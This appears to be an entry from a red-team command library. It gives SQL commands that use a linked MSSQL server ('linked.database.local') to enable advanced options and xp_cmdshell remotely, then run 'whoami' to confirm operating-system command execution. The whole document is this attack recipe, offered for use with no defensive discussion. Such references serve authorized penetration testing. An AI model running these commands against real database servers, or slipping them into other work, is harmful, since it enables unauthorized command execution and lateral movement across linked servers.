---
id: 9bc81634-005c-4227-ab89-a7d35ad40965
name: Enable advanced options and xp_cmdshell
type: command
executor: bash
data: 'SQL> EXECUTE(''EXEC sp_configure ''''show advanced options'''',1'') at "linked.database.local";

  SQL> EXECUTE(''RECONFIGURE'') at "linked.database.local";

  SQL> EXECUTE(''EXEC sp_configure ''''xp_cmdshell'''',1;'') at "linked.database.local";

  SQL> EXECUTE(''RECONFIGURE'') at "linked.database.local";

  SQL> EXECUTE(''exec xp_cmdshell whoami'') at "linked.database.local";'
output: null
created_at: '2023-04-06T03:56:20.127847+00:00'
updated_at: '2023-04-10T20:36:44.278822+00:00'
---

# Enable advanced options and xp_cmdshell

```bash
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```
